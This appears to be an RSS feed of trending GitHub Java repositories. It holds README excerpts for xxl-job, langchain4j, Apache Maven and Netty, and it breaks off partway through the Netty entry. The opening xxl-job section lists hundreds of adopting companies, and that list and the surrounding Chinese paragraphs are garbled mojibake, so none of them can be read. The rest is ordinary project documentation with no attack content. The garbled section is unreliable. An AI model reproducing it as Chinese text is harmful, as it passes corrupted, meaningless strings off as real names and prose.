- 576ã€�æ·±åœ³è¡Œå�¥è‡ªåŠ¨åŒ–è‚¡ä»½æœ‰é™�å…¬å�¸
- 577ã€�æ·±åœ³å¸‚å¯Œè��ä¿¡æ�¯ç§‘æŠ€æœ�åŠ¡æœ‰é™�å…¬å�¸
- 578ã€�è“�é¸Ÿäº‘
- 579ã€�ä¸Šæµ·æ¾�å�šè´¢ç»�èµ„è®¯æœ‰é™�å…¬å�¸
- 580ã€�åŒ—äº¬å°�é¸¦ç§‘æŠ€æœ‰é™�å…¬å�¸
- 581ã€�æ�­å·�ç›ˆæ³‰äº‘ç§‘æŠ€æœ‰é™�å…¬å�¸
- 582ã€�æƒŸå®¢æ•°æ�®
- 583ã€�GOSOé¦™èœœé—ºç§€
- 584ã€�æ™®ä¹�å¸ˆï¼ˆä¸Šæµ·ï¼‰æ•°å­—ç§‘æŠ€æœ‰é™�å…¬å�¸
- 585ã€�è¥¿å®‰å¸‚é›�å¡”åŒºå’–åŒ—å ‚ç½‘ç»œç§‘æŠ€éƒ¨
- 586ã€�å®�æ³¢è�šè‡»æ™ºèƒ½ç§‘æŠ€æœ‰é™�å…¬å�¸
- 587ã€�æ™®ä¹�å¸ˆæ•°å­—ç§‘æŠ€æœ‰é™�å…¬å�¸
- 588ã€�æ±Ÿè‹�èŸ¹è�”ç½‘ç§‘æŠ€æœ‰é™�å…¬å�¸
- 589ã€�æ�­å·�æœªæ™ºç§‘æŠ€æœ‰é™�å…¬å�¸
- 590ã€�å®‰å�‰æ™ºè¡Œç‰©æµ�æœ‰é™�å…¬å�¸
- 591ã€�å��ç”Ÿå¤§å®¶å±…é›†å›¢æœ‰é™�å…¬å�¸
- 592ã€�ç¾�å¿ƒé£Ÿå“�ï¼ˆå¹¿å·�ï¼‰æœ‰é™�å…¬å�¸
- 593ã€�è´§æ‹‰æ‹‰ã€�è´§æ‹‰æ‹‰APPã€‘
- 594ã€�æ�­å·�æ€�éŸ¬ç‘�ç§‘æŠ€æœ‰é™�å…¬å�¸
- 595ã€�æ�­å·�ç�–è��ç§‘æŠ€æœ‰é™�å…¬å�¸
- 596ã€�åŒ—äº¬ä¼˜æµ·ç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸
- 597ã€�æµ™æ±Ÿå¤§ç»´é«˜æ–°æŠ€æœ¯è‚¡ä»½æœ‰é™�å…¬å�¸
- 598ã€�ç²¤æ¸¯æ¾³å¤§æ¹¾åŒºæ•°å­—ç»�æµ�ç ”ç©¶é™¢
- 599ã€�æ™®åº·ï¼ˆæ�­å·�ï¼‰å�¥åº·ç§‘æŠ€æœ‰é™�å…¬å�¸
- 600ã€�å��è¥¿è¯�åˆ¸è‚¡ä»½æœ‰é™�å…¬å�¸ã€�å��è¥¿è¯�åˆ¸ã€‘
- 601ã€�æ�­å·�æµ·åº·æœºå™¨äººè‚¡ä»½æœ‰é™�å…¬å�¸ã€�æµ·åº·ã€‘
- 602ã€�æ²³å�—å®¸é‚¦ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 603ã€�æˆ�éƒ½æ¬¡å…ƒèŠ‚ç‚¹ç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸
- 604ã€�å¯Œå£«åº·ç§‘æŠ€é›†å›¢ã€�å¯Œå£«åº·ã€‘
- 605ã€�é�’å²›ä¸œè½¯è½½æ³¢ç§‘æŠ€è‚¡ä»½æœ‰é™�å…¬å�¸
- 606ã€�å°�è�Šå¿«è·‘ç§‘æŠ€æœ‰é™�å…¬å�¸
- 607ã€�è§†æº�è‚¡ä»½
- 608ã€�å®�æ³¢è�šè‡»æ™ºèƒ½ç§‘æŠ€æœ‰é™�å…¬å�¸
- 609ã€�é˜”å¤©ç§‘æŠ€æœ‰é™�å…¬å�¸
- 610ã€�ç½‘å®¿ç§‘æŠ€æœ‰é™�å…¬å�¸
- 611ã€�å�—äº¬æ¢µé¼�ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 612ã€�æˆ¿å¤©ä¸‹ã€�æˆ¿å¤©ä¸‹ã€‘
- 613ã€�ç‰¹ç“¦ç‰¹èƒ½æº�ç§‘æŠ€æœ‰é™�å…¬å�¸
- 614ã€�æ‹“è¿ªæ™ºèƒ½ç§‘æŠ€æœ‰é™�å…¬å�¸
- 615ã€�ä¸œè½¯é›†å›¢ã€�ä¸œè½¯ã€‘
- 616ã€�å¼€æ™®äº‘
- 617ã€�é¢†è¯¾ç½‘ç»œ
- 618ã€�å�—äº¬ç‰¹ç»´è½¯ä»¶æœ‰é™�å…¬å�¸
- 619ã€�ç¦�å»ºæ˜“è�”ä¼—ä¿�ç�¿é€šä¿¡æ�¯ç§‘æŠ€æœ‰é™�å…¬å�¸
- 620ã€�æµ™æ±Ÿæ ¸å¿ƒå�ŒèŠ±é¡ºé‡‘è��ç§‘æŠ€æœ‰é™�å…¬å�¸ã€�å�ŒèŠ±é¡ºã€‘
- 621ã€�æµ™æ±Ÿå�šè§‚ç‘�æ€�ç§‘æŠ€æœ‰é™�å…¬å�¸
- 622ã€�åŒ—äº¬æ–°ç¾�äº’é€šç§‘æŠ€æœ‰é™�å…¬å�¸
- 623ã€�åŒ—äº¬æœ‰ç”Ÿå�šå¤§è½¯ä»¶è‚¡ä»½æœ‰é™�å…¬å�¸
- 624ã€�æ—¶ä»£ä¸­å›½
- 625ã€�é±¼æ³¡ç½‘
- 626ã€�ä¸€ç²’æ–¹ç³–ï¼ˆå®‰å¾½ï¼‰ç§‘æŠ€æœ‰é™�å…¬å�¸
- 627ã€�åŒ—äº¬å¤–ç ”åœ¨çº¿æ•°å­—ç§‘æŠ€æœ‰é™�å…¬å�¸
- 628ã€�å¾·ç”µï¼ˆä¸­å›½ï¼‰é€šä¿¡æŠ€æœ¯æœ‰é™�å…¬å�¸
- 629ã€�æ�­å·�å¯»è�”ç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸
- 630ã€�æ©™è�”ï¼ˆä¸­å›½ï¼‰æœ‰é™�å…¬å�¸
- 631ã€�åŒ—äº¬æ‰¿å�¯é€šç§‘æŠ€æœ‰é™�å…¬å�¸
- 632ã€�é“¶è�”æ•°æ�®æœ�åŠ¡æœ‰é™�å…¬å�¸ã€�é“¶è�”ã€‘
- 633ã€�ä¸Šæµ·æ™¶ç¡®ç§‘æŠ€æœ‰é™�å…¬å�¸
- 634ã€�äºšä¿¡ç§‘æŠ€æœ‰é™�å…¬å�¸
- 635ã€�ç¦�å»ºæ–°èˆªç‰©è�”ç½‘ç§‘æŠ€æœ‰é™�å…¬å�¸
- 636ã€�ä¸Šæ‰¬è½¯ä»¶
- 637ã€�æ·±è“�æ±½è½¦ç§‘æŠ€æœ‰é™�å…¬å�¸
- 638ã€�å�—æ˜ŒèŠ‚ç‚¹æ±‡æ™ºç§‘æŠ€æœ‰é™�å…¬å�¸
- 639ã€�é”�æ˜�æŠ€æœ¯
- 640ã€�å†�é€ å†�ç”Ÿå�¥åº·ç§‘æŠ€æœ‰é™�å…¬å�¸
- 641ã€�å��å®�è¯�åˆ¸
- 642ã€�å�“æ­£åŒ»ç–—
- 643ã€�æ·±åœ³æ¹›ä¿¡ç§‘æŠ€
- 644ã€�é™•è¥¿é‘«ä¼—ä¸ºè½¯ä»¶æœ‰é™�å…¬å�¸
- 645ã€�æ·±åœ³å¸‚æ¶¦å†œç§‘æŠ€æœ‰é™�å…¬å�¸
- 646ã€�åºšå•†æ•™è‚²æ™ºèƒ½ç§‘æŠ€æœ‰é™�å…¬å�¸
- 647ã€�æ�­å·�ç¥�å£°ç§‘æŠ€
- 648ã€�å››å·�ä¹…è¿œé“¶æµ·è½¯ä»¶è‚¡ä»½æœ‰é™�å…¬å�¸
- 649ã€�GeeFoxæ��ç‹�ä½�ä»£ç �
- 650ã€�æµ™æ±Ÿå’Œä»�ç§‘æŠ€è‚¡ä»½æœ‰é™�å…¬å�¸
- 651ã€�å®�æ³¢è�šè‡»æ™ºèƒ½ç§‘æŠ€æœ‰é™�å…¬å�¸
- 652ã€�ç¦�å»ºç¦�æ˜•è½¯ä»¶å¼€å�‘è‚¡ä»½æœ‰é™�å…¬å�¸ã€�ç¦�æ˜•ã€‘
- 653ã€�å¹¿å·�ä¸­é•¿åº·è¾¾ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 654ã€�æ­¦æ±‰è¶£æ”¹ä¿¡æ�¯ç§‘æŠ€æœ‰é™�å…¬å�¸
- 655ã€�åŒ—äº¬å��å¤�æ€�æº�ç§‘æŠ€å�‘å±•æœ‰é™�å…¬å�¸
- 656ã€�å®�æ³¢å…³å…³é€šç§‘æŠ€æœ‰é™�å…¬å�¸
- 657ã€�é�’å²›å�•æ°�é¤�é¥®æœ‰é™�å…¬å�¸
- 658ã€�æ�­å·�ä¹�åˆ»ç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸
- 659ã€�ä¸Šæµ·çº¢ç“¦ä¿¡æ�¯ç§‘æŠ€æœ‰é™�å…¬å�¸
- 660ã€�é™•è¥¿æ—…å°�å®�ä¿¡æ�¯ç§‘æŠ€æœ‰é™�å…¬å�¸
- 661ã€�ä¸­ç§‘å�“æ�’(å¤§è¿�)ç§‘æŠ€æœ‰é™�å…¬å�¸
- 662ã€�åŒ—äº¬å��ç›Šç²¾ç‚¹ç”Ÿç‰©æŠ€æœ¯æœ‰é™�å…¬å�¸
- 663ã€�é©¬å£«åŸºï¼ˆä¸­å›½ï¼‰èˆªè¿�æœ‰é™�å…¬å�¸ã€�é©¬å£«åŸºã€‘
- 664ã€�é™•è¥¿ç¾�å’šç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸
- 665ã€�å±±ä¸œæ–°åŒ—æ´‹ä¿¡æ�¯æŠ€æœ¯è‚¡ä»½æœ‰é™�å…¬å�¸ 
- 666ã€�ç¦�å»ºä¸­ç‘�æ–‡åŒ–å�‘å±•é›†å›¢æœ‰é™�å…¬å�¸
- 667ã€�é»‘é¾™æ±Ÿçœ�å»ºå·¥é›†å›¢æœ‰é™�è´£ä»»å…¬å�¸ã€�é»‘é¾™æ±Ÿçœ�å»ºå·¥ã€‘
- 668ã€�å¿—ä¿¡èƒ½è¾¾å®‰å…¨ç§‘æŠ€(å¹¿å·�)æœ‰é™�å…¬å�¸
- 669ã€�é‡�åº†å¼€æº�å…±åˆ›ç§‘æŠ€æœ‰é™�å…¬å�¸
- 670ã€�å��æ³°äººå¯¿ä¿�é™©è‚¡ä»½æœ‰é™�å…¬å�¸ã€�å��æ³°äººå¯¿ã€‘
- 671ã€�æˆ�éƒ½ç›˜å�¤çºµæ¨ªé›†å›¢
- 672ã€�åŒ—äº¬æ�œæ�œä¹�å­¦ç§‘æŠ€æœ‰é™�å…¬å�¸
- 673ã€�åŒ—äº¬å‡Œäº‘ç©ºé—´ç§‘æŠ€æœ‰é™�å…¬å�¸
- 674ã€�ä¸´å·¥é‡�æœºè‚¡ä»½æœ‰é™�å…¬å�¸
- 675ã€�ä¸Šæµ·çƒ­é£�æ—¶å°šç®¡ç�†é›†å›¢ã€�çƒ­é£�ã€‘
- 676ã€�HashKey Exchange
- 677ã€�å‚²åŸºï¼ˆæ·±åœ³ï¼‰è·¨å¢ƒå•†åŠ¡è‚¡ä»½æœ‰é™�å…¬å�¸
- 678ã€�é�’å²›æ–‡è¾¾é€šç§‘æŠ€è‚¡ä»½æœ‰é™�å…¬å�¸
- 679ã€�æ�­å·�æ™®ç½—äº‘ç§‘æŠ€æœ‰é™�å…¬å�¸
- 680ã€�æµ™æ±Ÿäº‘é¹­ç§‘æŠ€æœ‰é™�å…¬å�¸
- 681ã€�ä¸­å±±å¸‚èŠ¯å®�æŸ¿ç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸
- 682ã€�æ·±åœ³å¸‚å®¶å®¶é¡ºç‰©è�”ç§‘æŠ€
- 683ã€�é‡�åº†æ–‘è¥¿ç§‘æŠ€æœ‰é™�å…¬å�¸
- 684ã€�ç¦�å»ºçœ�æ³°å�¤ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 685ã€�è´µé˜³æ°¸é�’ä»ªç”µç§‘æŠ€æœ‰é™�å…¬å�¸
- 686ã€�å¹¿å·�å�šä¾�ç‰¹æ™ºèƒ½ä¿¡æ�¯ç§‘æŠ€æœ‰é™�å…¬å�¸
- 687ã€�æ²³å�—å® å‘¦å‘¦ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 688ã€�é™•è¥¿æ˜Ÿé‚‘ç©ºé—´æŠ€æœ¯æœ‰é™�å…¬å�¸
- 689ã€�å¹¿ä¸œè¥¿æ¬§å…‹å®�ä¸šæœ‰é™�å…¬å�¸
- 690ã€�å”±å�§éº¦é¢‚KTV
- 691ã€�è�”é€šäº‘
- 692ã€�åŒ—äº¬çˆ±è¯�æœ¬ç§‘æŠ€æœ‰é™�å…¬å�¸
- 693ã€�åŒ—äº¬èµ·åˆ›ç§‘æŠ€æœ‰é™�å…¬å�¸
- â€¦â€¦
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;æ›´å¤šæ�¥å…¥çš„å…¬å�¸ï¼Œæ¬¢è¿�åœ¨ &lt;a href="https://github.com/xuxueli/xxl-job/issues/1"&gt;ç™»è®°åœ°å�€&lt;/a&gt; ç™»è®°ï¼Œç™»è®°ä»…ä»…ä¸ºäº†äº§å“�æ�¨å¹¿ã€‚&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;æ¬¢è¿�å¤§å®¶çš„å…³æ³¨å’Œä½¿ç”¨ï¼ŒXXL-JOBä¹Ÿå°†æ‹¥æŠ±å�˜åŒ–ï¼ŒæŒ�ç»­å�‘å±•ã€‚&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;Contributions are welcome! Open a pull request to fix a bug, or open an &lt;a href="https://github.com/xuxueli/xxl-job/issues/"&gt;Issue&lt;/a&gt; to discuss a new feature or change.&lt;/p&gt; 
&lt;p&gt;æ¬¢è¿�å�‚ä¸�é¡¹ç›®è´¡çŒ®ï¼�æ¯”å¦‚æ��äº¤PRä¿®å¤�ä¸€ä¸ªbugï¼Œæˆ–è€…æ–°å»º &lt;a href="https://github.com/xuxueli/xxl-job/issues/"&gt;Issue&lt;/a&gt; è®¨è®ºæ–°ç‰¹æ€§æˆ–è€…å�˜æ›´ã€‚&lt;/p&gt; 
&lt;h2&gt;Copyright and License&lt;/h2&gt; 
&lt;p&gt;This product is open source and free, and will continue to provide free community technical support. Individual or enterprise users are free to access and use.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Licensed under the GNU General Public License (GPL) v3.&lt;/li&gt; 
 &lt;li&gt;Copyright (c) 2015-present, xuxueli.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;äº§å“�å¼€æº�å…�è´¹ï¼Œå¹¶ä¸”å°†æŒ�ç»­æ��ä¾›å…�è´¹çš„ç¤¾åŒºæŠ€æœ¯æ”¯æŒ�ã€‚ä¸ªäººæˆ–ä¼�ä¸šå†…éƒ¨å�¯è‡ªç”±çš„æ�¥å…¥å’Œä½¿ç”¨ã€‚å¦‚æœ‰éœ€è¦�å�¯ &lt;a href="https://www.xuxueli.com/page/community.html"&gt;é‚®ä»¶è�”ç³»&lt;/a&gt; ä½œè€…å…�è´¹è�·å�–é¡¹ç›®æ�ˆæ�ƒã€‚&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>langchain4j/langchain4j</title>
      <link>https://github.com/langchain4j/langchain4j</link>
      <description>&lt;p&gt;Java version of LangChain&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;LangChain for Java: Supercharge your Java application with the power of LLMs&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/langchain4j/langchain4j/actions/workflows/main.yaml"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/langchain4j/langchain4j/main.yaml?branch=main&amp;amp;style=for-the-badge&amp;amp;label=CI%20BUILD&amp;amp;logo=github" alt="Build Status"&gt;&lt;/a&gt; &lt;a href="https://github.com/langchain4j/langchain4j/actions/workflows/nightly_jdk17.yaml"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/langchain4j/langchain4j/nightly_jdk17.yaml?branch=main&amp;amp;style=for-the-badge&amp;amp;label=NIGHTLY%20BUILD&amp;amp;logo=github" alt="Nightly Build"&gt;&lt;/a&gt; &lt;a href="https://app.codacy.com/gh/langchain4j/langchain4j/dashboard"&gt;&lt;img src="https://img.shields.io/badge/Codacy-Dashboard-blue?style=for-the-badge&amp;amp;logo=codacy" alt="CODACY"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://discord.gg/JzTFvyjG6R"&gt;&lt;img src="https://dcbadge.vercel.app/api/server/JzTFvyjG6R?style=for-the-badge" alt="Discord"&gt;&lt;/a&gt; &lt;a href="https://bsky.app/profile/langchain4j.dev"&gt;&lt;img src="https://img.shields.io/badge/@langchain4j-follow-blue?logo=bluesky&amp;amp;style=for-the-badge" alt="BlueSky"&gt;&lt;/a&gt; &lt;a href="https://x.com/langchain4j"&gt;&lt;img src="https://img.shields.io/badge/@langchain4j-follow-blue?logo=x&amp;amp;style=for-the-badge" alt="X"&gt;&lt;/a&gt; &lt;a href="https://search.maven.org/#search%7Cgav%7C1%7Cg:%22dev.langchain4j%22%20AND%20a:%22langchain4j%22"&gt;&lt;img src="https://img.shields.io/maven-central/v/dev.langchain4j/langchain4j?logo=apachemaven&amp;amp;style=for-the-badge" alt="Maven Version"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;Welcome!&lt;/p&gt; 
&lt;p&gt;The goal of LangChain4j is to simplify integrating LLMs into Java applications.&lt;/p&gt; 
&lt;p&gt;Here's how:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Unified APIs:&lt;/strong&gt; LLM providers (like OpenAI or Google Vertex AI) and embedding (vector) stores (such as Pinecone or Milvus) use proprietary APIs. LangChain4j offers a unified API to avoid the need for learning and implementing specific APIs for each of them. To experiment with different LLMs or embedding stores, you can easily switch between them without the need to rewrite your code. LangChain4j currently supports &lt;a href="https://docs.langchain4j.dev/integrations/language-models/"&gt;15+ popular LLM providers&lt;/a&gt; and &lt;a href="https://docs.langchain4j.dev/integrations/embedding-stores/"&gt;15+ embedding stores&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Comprehensive Toolbox:&lt;/strong&gt; Since early 2023, the community has been building numerous LLM-powered applications, identifying common abstractions, patterns, and techniques. LangChain4j has refined these into practical code. Our toolbox includes tools ranging from low-level prompt templating, chat memory management, and function calling to high-level patterns like Agents and RAG. For each abstraction, we provide an interface along with multiple ready-to-use implementations based on common techniques. Whether you're building a chatbot or developing a RAG with a complete pipeline from data ingestion to retrieval, LangChain4j offers a wide variety of options.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Numerous Examples:&lt;/strong&gt; These &lt;a href="https://github.com/langchain4j/langchain4j-examples"&gt;examples&lt;/a&gt; showcase how to begin creating various LLM-powered applications, providing inspiration and enabling you to start building quickly.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;LangChain4j began development in early 2023 amid the ChatGPT hype. We noticed a lack of Java counterparts to the numerous Python and JavaScript LLM libraries and frameworks, and we had to fix that! Although "LangChain" is in our name, the project is a fusion of ideas and concepts from LangChain, Haystack, LlamaIndex, and the broader community, spiced up with a touch of our own innovation.&lt;/p&gt; 
&lt;p&gt;We actively monitor community developments, aiming to quickly incorporate new techniques and integrations, ensuring you stay up-to-date. The library is under active development. While some features are still being worked on, the core functionality is in place, allowing you to start building LLM-powered apps now!&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;Documentation can be found &lt;a href="https://docs.langchain4j.dev"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The documentation chatbot (experimental) can be found &lt;a href="https://chat.langchain4j.dev/"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Getting Started&lt;/h2&gt; 
&lt;p&gt;Getting started guide can be found &lt;a href="https://docs.langchain4j.dev/get-started"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Code Examples&lt;/h2&gt; 
&lt;p&gt;Please see examples of how LangChain4j can be used in &lt;a href="https://github.com/langchain4j/langchain4j-examples"&gt;langchain4j-examples&lt;/a&gt; repo:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/langchain4j/langchain4j-examples/tree/main/other-examples/src/main/java"&gt;Examples in plain Java&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/quarkiverse/quarkus-langchain4j/tree/main/samples"&gt;Examples with Quarkus&lt;/a&gt; (uses &lt;a href="https://github.com/quarkiverse/quarkus-langchain4j"&gt;quarkus-langchain4j&lt;/a&gt; dependency)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/langchain4j/langchain4j-examples/tree/main/spring-boot-example/src/main/java/dev/langchain4j/example"&gt;Example with Spring Boot&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/helidon-io/helidon-examples/tree/helidon-4.x/examples/integrations/langchain4j"&gt;Examples with Helidon&lt;/a&gt; (uses &lt;a href="https://mvnrepository.com/artifact/io.helidon.integrations.langchain4j"&gt;io.helidon.integrations.langchain4j&lt;/a&gt; dependency)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/micronaut-projects/micronaut-langchain4j/tree/0.3.x/doc-examples/example-openai-java"&gt;Examples with Micronaut&lt;/a&gt; (uses &lt;a href="https://micronaut-projects.github.io/micronaut-langchain4j/latest/guide/"&gt;micronaut-langchain4j&lt;/a&gt; dependency)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Useful Materials&lt;/h2&gt; 
&lt;p&gt;Useful materials can be found &lt;a href="https://docs.langchain4j.dev/useful-materials"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Get Help&lt;/h2&gt; 
&lt;p&gt;Please use &lt;a href="https://discord.gg/JzTFvyjG6R"&gt;Discord&lt;/a&gt; or &lt;a href="https://github.com/langchain4j/langchain4j/discussions"&gt;GitHub discussions&lt;/a&gt; to get help.&lt;/p&gt; 
&lt;h2&gt;Request Features&lt;/h2&gt; 
&lt;p&gt;Please let us know what features you need by &lt;a href="https://github.com/langchain4j/langchain4j/issues/new/choose"&gt;opening an issue&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Contribute&lt;/h2&gt; 
&lt;p&gt;Contribution guidelines can be found &lt;a href="https://github.com/langchain4j/langchain4j/raw/main/CONTRIBUTING.md"&gt;here&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>apache/maven</title>
      <link>https://github.com/apache/maven</link>
      <description>&lt;p&gt;Apache Maven core&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Apache Maven&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://www.apache.org/licenses/LICENSE-2.0"&gt;&lt;img src="https://img.shields.io/github/license/apache/maven.svg?label=License" alt="Apache License, Version 2.0, January 2004"&gt;&lt;/a&gt; &lt;a href="https://search.maven.org/artifact/org.apache.maven/apache-maven"&gt;&lt;img src="https://img.shields.io/maven-central/v/org.apache.maven/apache-maven.svg?label=Maven%20Central&amp;amp;versionPrefix=3." alt="Maven Central"&gt;&lt;/a&gt; &lt;a href="https://search.maven.org/artifact/org.apache.maven/apache-maven"&gt;&lt;img src="https://img.shields.io/maven-central/v/org.apache.maven/apache-maven.svg?label=Maven%20Central" alt="Maven Central"&gt;&lt;/a&gt; &lt;a href="https://github.com/jvm-repo-rebuild/reproducible-central/raw/master/content/org/apache/maven/maven/README.md"&gt;&lt;img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/jvm-repo-rebuild/reproducible-central/master/content/org/apache/maven/maven/badge.json" alt="Reproducible Builds"&gt;&lt;/a&gt; &lt;a href="https://ci-maven.apache.org/job/Maven/job/maven-box/job/maven/job/master/"&gt;&lt;img src="https://img.shields.io/jenkins/s/https/ci-maven.apache.org/job/Maven/job/maven-box/job/maven/job/master.svg?" alt="Jenkins Status"&gt;&lt;/a&gt; &lt;a href="https://ci-maven.apache.org/job/Maven/job/maven-box/job/maven/job/master/lastCompletedBuild/testReport/"&gt;&lt;img src="https://img.shields.io/jenkins/t/https/ci-maven.apache.org/job/Maven/job/maven-box/job/maven/job/master.svg?" alt="Jenkins tests"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Apache Maven is a software project management and comprehension tool. Based on the concept of a project object model (POM), Maven can manage a project's build, reporting and documentation from a central piece of information.&lt;/p&gt; 
&lt;p&gt;If you think you have found a bug, please file an issue in the &lt;a href="https://github.com/apache/maven/issues"&gt;Maven Issue Tracker&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;More information can be found on &lt;a href="https://maven.apache.org/"&gt;Apache Maven Homepage&lt;/a&gt;. Questions related to the usage of Maven should be posted on the &lt;a href="https://maven.apache.org/mailing-lists.html"&gt;Maven User List&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Where can I get the latest release?&lt;/h2&gt; 
&lt;p&gt;You can download the release source from our &lt;a href="https://maven.apache.org/download.cgi"&gt;download page&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;If you are interested in the development of Maven, please consult the documentation first and afterward you are welcome to join the developers mailing list to ask questions or discuss new ideas/features/bugs etc.&lt;/p&gt; 
&lt;p&gt;Take a look into the &lt;a href="https://raw.githubusercontent.com/apache/maven/master/CONTRIBUTING.md"&gt;contribution guidelines&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;This code is under the &lt;a href="https://www.apache.org/licenses/LICENSE-2.0"&gt;Apache License, Version 2.0, January 2004&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;See the &lt;a href="https://raw.githubusercontent.com/apache/maven/master/NOTICE"&gt;&lt;code&gt;NOTICE&lt;/code&gt;&lt;/a&gt; file for required notices and attributions.&lt;/p&gt; 
&lt;h2&gt;Donations&lt;/h2&gt; 
&lt;p&gt;Do you like Apache Maven? Then &lt;a href="https://www.apache.org/foundation/contributing.html"&gt;donate back to the ASF&lt;/a&gt; to support the development.&lt;/p&gt; 
&lt;h2&gt;Quick Build&lt;/h2&gt; 
&lt;p&gt;If you want to bootstrap Maven, you'll need:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Java 17+&lt;/li&gt; 
 &lt;li&gt;Maven 3.6.3 or later&lt;/li&gt; 
 &lt;li&gt;Run Maven, specifying a location into which the completed Maven distro should be installed: &lt;pre&gt;&lt;code&gt;mvn -DdistributionTargetDir="$HOME/app/maven/apache-maven-4.0.x-SNAPSHOT" clean package
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>netty/netty</title>
      <link>https://github.com/netty/netty</link>
      <description>&lt;p&gt;Netty project - an event-driven asynchronous network application framework&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src="https://github.com/netty/netty/workflows/Build%20project/badge.svg?sanitize=true" alt="Build project"&gt;&lt;/p&gt; 
&lt;h1&gt;Netty Project&lt;/h1&gt; 
&lt;p&gt;Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp;amp; clients.&lt;/p&gt; 
&lt;h2&gt;Links&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://netty.io/"&gt;Web Site&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://netty.io/downloads.html"&gt;Downloads&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://netty.io/wiki/"&gt;Documentation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://twitter.com/netty_project"&gt;@netty_project&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://discord.gg/q4aQ2XjaCa"&gt;Official Discord server&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/netty/netty/4.2/testsuite-jpms/README.md"&gt;Modular Netty guide&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;How to build&lt;/h2&gt; 
&lt;p&gt;For the detailed information about building and developing Netty, please visit &lt;a href="https://netty.io/wiki/developer-guide.html"&gt;the developer guide&lt;/a&gt;. This page only gives very basic information.&lt;/p&gt; 
&lt;p&gt;You require the following to build Netty:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Latest stable &lt;a href="https://adoptium.net/"&gt;OpenJDK 8&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Latest stable &lt;a href="https://maven.apache.org/"&gt;Apache Maven&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;If you are on Linux or MacOS, you need &lt;a href="https://netty.io/wiki/native-transports.html"&gt;additional development packages&lt;/a&gt; installed on your system, because you'll build the native transport.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Note that this is build-time requirement. JDK 5 (for 3.x) or 6 (for 4.0+ / 4.1+) is enough to run your Netty-based application.&lt;/p&gt; 
&lt;h2&gt;Branches to look&lt;/h2&gt; 
